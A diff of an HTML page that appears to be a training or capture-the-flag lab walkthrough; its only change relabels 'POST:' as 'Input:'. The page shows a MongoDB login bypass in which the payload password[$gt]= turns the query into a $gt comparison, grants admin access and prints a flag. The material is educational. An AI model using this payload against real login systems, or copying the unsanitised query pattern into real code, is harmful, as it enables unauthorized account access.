@@ -7,7 +7,7 @@
         <span class="terminal-title">Step 1. Normal Login (Wrong Password)</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">POST: </span>username=admin&amp;password=wrongpass<br>
+        <span class="prompt">Input: </span>username=admin&amp;password=wrongpass<br>
         <span class="prompt">Query: </span>db.users.findOne({"username": "admin", "password": "wrongpass"})<br><br>
         <span class="prompt">Output: </span>Invalid username or password.
     </div>
@@ -27,7 +27,7 @@
         <span class="terminal-title">Step 2: $gt Operator Injection</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">POST: </span>username=admin&amp;password[$gt]=<br>
+        <span class="prompt">Input: </span>username=admin&amp;password[$gt]=<br>
         <span class="prompt">Query: </span>db.users.findOne({"username": "admin", "password": {"$gt": ""}})<br><br>
         <span class="prompt">Output: </span>Welcome, <strong>admin</strong>! Role: admin<br>
         Admin access granted! The flag is: <strong>FLAG{mg_gt_0p3r4t0r_byp4ss}</strong>
